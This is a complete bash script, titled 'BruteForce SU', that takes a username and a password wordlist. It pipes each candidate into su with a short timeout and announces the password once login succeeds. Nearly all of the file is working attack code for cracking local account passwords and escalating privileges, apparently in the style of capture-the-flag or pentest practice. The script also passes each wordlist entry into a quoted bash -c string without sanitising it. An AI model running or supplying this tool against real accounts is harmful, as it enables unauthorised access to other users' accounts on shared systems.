#!/bin/bash

# Function executed if the user does not provide 2 arguments.
show_help() {
    echo -e "\e[1;33mUsage: $0 USER DICTIONARY"
    echo -e "\e[1;31mYou must specify both the username and the dictionary file.\e[0m"
    exit 1
}

# Prints a simple banner in some part of the script.
print_banner() {
    echo -e "\e[1;34m"  # Change text to bright blue
    echo "******************************"
    echo "*     BruteForce SU         *"
    echo "******************************"
    echo -e "\e[0m"  # Reset colors to default values
}

# This function is called from trap finalize SIGINT (when the user presses Ctrl + C to exit)
finalize() {
    echo -e "\e[1;31m\nFinishing script\e[0m"
    exit
}

trap finalize SIGINT

user=$1
dictionary=$2

# Special variable $# used to check the number of arguments provided. If not equal to 2, show instructions.
if [[ $# != 2 ]]; then
    show_help
fi

# Print the banner when starting the attack.
print_banner

# While loop that reads line by line from the $dictionary variable, which is passed as a parameter.
while IFS= read -r password; do
    echo "Testing password: $password"
    if timeout 0.1 bash -c "echo '$password' | su $user -c 'echo Hello'" > /dev/null 2>&1; then
        clear
        echo -e "\e[1;32mPassword found for user $user: $password\e[0m"
        break
    fi
done < "$dictionary"
